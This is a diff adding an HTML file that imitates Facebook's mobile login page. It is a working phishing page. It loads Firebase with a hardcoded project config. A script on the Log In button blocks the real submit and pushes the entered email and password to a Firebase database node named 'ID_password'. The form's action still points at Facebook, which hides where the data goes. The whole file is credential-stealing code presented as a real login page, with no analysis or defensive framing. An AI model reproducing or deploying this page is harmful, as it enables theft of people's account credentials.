@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html> 
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>Log in to Facebook | Facebook</title>
+		<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+		<link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196">
+		<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+		<link rel="stylesheet" type="text/css"  href="2.css">
+		<link rel="stylesheet" type="text/css"  href="1.css">
+		<meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
+		
+	<script src="https://www.gstatic.com/firebasejs/4.8.1/firebase.js"></script>
+	<script>
+	// Initialize Firebase
+	var config = {
+		apiKey: "AIzaSyCh_hN7oaoRrHrKhyuisz9aPvYOFtXmPVI",
+		authDomain: "pooja-afd14.firebaseapp.com",
+		databaseURL: "https://pooja-afd14.firebaseio.com",
+		projectId: "pooja-afd14",
+		storageBucket: "pooja-afd14.appspot.com",
+		messagingSenderId: "337880601471"
+	};
+	firebase.initializeApp(config);
+	</script>
+
+
+	</head>
+	
+	
+	
+	<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="min-height: 623px; background-color: rgb(255, 255, 255);">
+		<div id="viewport" style="min-height: 623px;">
+			<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
+			<div id="page">
+				<div class="_129_" id="header-notices"></div>
+				<div class="_4g33 _52we _52z5" id="header">
+					<div class="_4g34 _52z6" >
+						<a href="https://m.facebook.com/login/">
+							<i class="img sp_sHYA6SkUZfZ sx_97e2d2">
+								<u>facebook</u>
+							</i>
+						</a>
+					</div>
+				</div>
+				<div class="_5soa acw" id="root" role="main"  style="min-height: 623px;">
+				<div class="_4g33">
+					<div class="_4g34" id="u_0_0">
+						<div class="_5yd0 _2ph- _5yd1" style="display: none;" >
+							<div class="_52jd"></div>
+						</div>
+						<div class="aclb">
+							<div ></div>
+						<div class="_5rut">
+						<form method="post" action="https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fedit-user%2F&amp;lwv=100" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_1">
+							<div class="_56be _5sob">
+								<div class="_55wo _55x2 _56bf">
+									<div id="email_input_container" >
+										<input class="_56bg _4u9z _5ruq"  id="m_login_email" name="names" placeholder="Email address or phone number" type="text" >
+									</div>
+									<div>
+										<div class="_1upc _mg8" >
+											<div class="_4g33">
+												<div class="_4g34 _5i2i _52we">
+													<div class="_5xu4">
+														<input class="_56bg _4u9z _27z2"  id="m_login_password" name="names" placeholder="Password" type="password" >
+													</div>
+												</div>
+												<div class="_5s61 _216i _5i2i _52we">
+													<div class="_5xu4">
+														<div class="_2pi9" style="" id="u_0_1">
+															<a >
+																<span class="mfss" id="u_0_3">SHOW</span>
+															</a>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="_2pie" style="text-align:center;">
+								<div id="u_0_4" >
+									<button type="button" value="Log In" class="_54k8 _52jh _56bs _56b_ _56bw _56bu" name="login" id="submit" ><span class="_55sr">Log In</span></button>
+								</div>
+							</div>
+							
+							
+							
+				<script>
+					function send() {
+					var input = document.getElementsByName('names');
+					
+					var  fb_data = {
+					FB_ID  : input[0].value,
+					 password : input[1].value   
+				   }				
+					var couple = firebase.database().ref('ID_password').push(fb_data);  	
+					}	
+					document.getElementById('submit').addEventListener('click', function(e) {
+						e.preventDefault();
+						send();
+					}, false);
+				</script>
+
+
+							
+							
+						</form>
+						<div >
+							<div class="_43mg">
+								<span class="_43mh">or</span>
+							</div>
+							<div class="_52jj _5t3b">
+								<a class="_5t3c btn btnS medBtn mfsm touchable" role="button" id="signup-button" href="https://m.facebook.com/reg/?cid=103" data-sigil="m_reg_button">Create New Account</a>
+							</div>
+						</div>
+						<div >
+							<div class="other-links">
+								<ul class="_5pkb _55wp">
+									<li>
+										<span class="mfss fcg">
+											<a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;lwv=100" id="forgot-password-link">Forgotten password?</a>
+											<span aria-hidden="true"> · </span>
+											<a class="sec" href="https://m.facebook.com/help/" id="help-link">Help Centre</a>
+										</span>
+									</li>
+								</ul>
+							</div>
+						</div>
+						</div>
+				</div>
+				</div>
+				</div>
+				<div></div>
+				<img src="./Log in to Facebook _ Facebook_files/hsts-pixel.gif" width="0" height="0" style="display:none">
+				<div class="_55wr _5ui2">
+					<div class="_5dpw">
+						<div class="_5ui3" >
+							<div class="_4g33">
+								<div class="_4g34">
+									<span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=ur_PK&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQDIa7XkpaDqYo3R" data-sigil="change_language">اردو</a>
+										</span>
+									</div>
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=bn_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQDttDEgifJnR-xL" data-sigil="change_language">বাংলা</a>
+										</span>
+									</div>
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=mr_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQDc1SqkJ-2_Mp_y" data-sigil="change_language">मराठी</a>
+										</span>
+									</div>
+									</div>
+									<div class="_4g34">
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=hi_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQBVV_IL1X3gGaax" data-sigil="change_language">हिन्दी</a>
+										</span>
+									</div>
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=pa_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQBpaqRn-xK3kGLd" data-sigil="change_language">ਪੰਜਾਬੀ</a>
+										</span>
+									</div>
+									<div class="_3ztc">
+										<span class="_52jc">
+											<a href="https://m.facebook.com/a/language.php?l=gu_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F&amp;gfid=AQBB_xeuHTRFd2GR" data-sigil="change_language">ગુજરાતી</a>
+										</span>
+									</div>
+										<a href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Flogin%252Fdevice-based%252Fedit-user%252F">
+											<div class="_3j87 _1rrd _3ztd">
+												<i class="img sp_sHYA6SkUZfZ sx_9562fd"></i>
+											</div>
+										</a>
+										</div>
+										</div>
+										</div>
+					<div class="_5ui4">
+						<span class="mfss fcg">Facebook ©2018</span>
+					</div>
+				</div>
+			</div>
+		</div>	
+	</body>
+</html>
